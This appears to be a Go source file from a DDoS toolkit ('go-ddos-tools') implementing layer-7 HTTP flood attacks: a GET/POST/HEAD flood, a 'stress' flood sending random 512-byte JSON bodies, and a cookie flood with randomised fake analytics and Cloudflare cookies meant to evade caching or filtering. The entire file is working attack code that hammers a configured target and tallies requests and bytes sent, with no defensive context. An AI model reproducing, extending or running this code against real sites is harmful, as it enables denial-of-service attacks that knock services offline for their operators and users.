package layer7

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/go-ddos-tools/pkg/core"
	"github.com/go-ddos-tools/pkg/utils"
)

// HTTPFlood implements basic HTTP flooding (GET, POST, HEAD)
type HTTPFlood struct {
	*BaseAttack
	Method string
}

func NewHTTPFlood(cfg *core.AttackConfig, method string) *HTTPFlood {
	return &HTTPFlood{
		BaseAttack: NewBaseAttack(cfg),
		Method:     method,
	}
}

func (h *HTTPFlood) Attack(ctx context.Context) error {
	for i := 0; i < h.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		var req *http.Request
		var err error
		var payloadLen int

		switch h.Method {
		case "POST":
			payload := fmt.Sprintf(`{"data": "%s"}`, utils.RandString(32))
			payloadLen = len(payload)
			req, err = http.NewRequest("POST", h.Config.Target, strings.NewReader(payload))
			if err == nil {
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Content-Length", fmt.Sprintf("%d", payloadLen))
			}
		default: // GET, HEAD
			req, err = http.NewRequest(h.Method, h.Config.Target, nil)
		}

		if err != nil {
			continue // Skip iteration on error
		}

		h.AddHeaders(req)

		resp, err := h.Client.Do(req)
		if err == nil {
			h.Config.RequestsSent.Add(1)
			h.Config.BytesSent.Add(int64(EstimateRequestSize(req) + payloadLen))
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
	return nil
}

// StressFlood implements STRESS method
type StressFlood struct {
	*BaseAttack
}

func NewStressFlood(cfg *core.AttackConfig) *StressFlood {
	return &StressFlood{
		BaseAttack: NewBaseAttack(cfg),
	}
}

func (s *StressFlood) Attack(ctx context.Context) error {
	for i := 0; i < s.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		payload := fmt.Sprintf(`{"data": "%s"}`, utils.RandString(512))
		req, err := http.NewRequest("POST", s.Config.Target, strings.NewReader(payload))
		if err != nil {
			continue
		}

		s.AddHeaders(req)
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Content-Length", fmt.Sprintf("%d", len(payload)))

		resp, err := s.Client.Do(req)
		if err == nil {
			s.Config.RequestsSent.Add(1)
			s.Config.BytesSent.Add(int64(EstimateRequestSize(req) + len(payload)))
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
	return nil
}

// CookieFlood implements COOKIE method
type CookieFlood struct {
	*BaseAttack
}

func NewCookieFlood(cfg *core.AttackConfig) *CookieFlood {
	return &CookieFlood{
		BaseAttack: NewBaseAttack(cfg),
	}
}

func (c *CookieFlood) Attack(ctx context.Context) error {
	for i := 0; i < c.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		req, err := http.NewRequest("GET", c.Config.Target, nil)
		if err != nil {
			continue
		}

		c.AddHeaders(req)
		cookie := fmt.Sprintf("_ga=GA%d; _gat=1; __cfduid=dc232334gwdsd23434542342342342475611928; %s=%s",
			utils.RandInt(1000, 99999),
			utils.RandString(6),
			utils.RandString(32))
		req.Header.Set("Cookie", cookie)

		resp, err := c.Client.Do(req)
		if err == nil {
			c.Config.RequestsSent.Add(1)
			c.Config.BytesSent.Add(int64(EstimateRequestSize(req)))
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
	return nil
}
